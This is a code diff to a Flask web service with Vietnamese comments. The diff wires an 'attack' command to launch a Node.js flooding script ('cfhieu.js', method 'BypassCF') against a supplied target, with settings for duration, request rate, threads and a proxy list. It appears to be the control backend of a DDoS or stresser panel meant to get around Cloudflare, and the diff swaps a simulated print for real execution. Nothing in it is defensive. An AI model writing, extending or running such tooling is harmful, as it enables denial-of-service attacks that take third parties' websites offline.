@@ -2,21 +2,35 @@
 import os, sys, json, time
 from typing import Any, Dict
 from flask import Flask, request, jsonify
+import subprocess
 
 # ========= (A) HANDLERS: móc vào logic thật của bạn =========
 
-def handle_attack(target: str, duration: int, method: str = "BypassCF", **kwargs) -> Dict[str, Any]:
-    # TODO: gọi hàm tấn công thật của bạn ở đây
-    # Lấy các tham số bổ sung từ kwargs
+def handle_attack(**kwargs) -> Dict[str, Any]:
+    # Lấy các tham số từ kwargs
+    target = kwargs.get("target")
+    duration = int(kwargs.get("duration", 60))  # Chuyển time thành duration
+    method = kwargs.get("method", "BypassCF")
     script = kwargs.get("script", "cfhieu.js")
     rate = kwargs.get("rate", "8")
     thread = kwargs.get("thread", "4")
     proxyfile = kwargs.get("proxyfile", "proxy.txt")
     
-    # Logic giả lập (thay bằng code thật để chạy script)
-    print(f"Running attack: target={target}, duration={duration}, method={method}, script={script}, rate={rate}, thread={thread}, proxyfile={proxyfile}")
+    # Chạy script JS bằng Node.js
+    try:
+        cmd = ["node", script, "--target", target, "--duration", str(duration), "--rate", rate, "--thread", thread, "--proxyfile", proxyfile]
+        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
+        status = "running"
+        print(f"Script output: {result.stdout}")
+    except subprocess.CalledProcessError as e:
+        status = "failed"
+        print(f"Error running script: {e.stderr}")
+    except FileNotFoundError:
+        status = "failed"
+        print(f"Error: Node.js or {script} not found. Ensure Node.js is installed and {script} exists.")
+    
     return {
-        "status": "running",
+        "status": status,
         "task_id": f"ga-{int(time.time())}",
         "target": target,
         "duration": duration,
@@ -50,10 +64,7 @@ def process_task(payload: Dict[str, Any]) -> Dict[str, Any]:
     args = payload.get("args", {}) or {}
 
     if cmd == "attack":
-        target   = args.get("target")
-        duration = int(args.get("duration", 60))  # Chuyển time thành duration
-        method   = args.get("method", "BypassCF")
-        return handle_attack(target, duration, method, **args)
+        return handle_attack(**args)
 
     if cmd == "addproxy":
         return handle_add_proxy(args.get("proxy", ""))
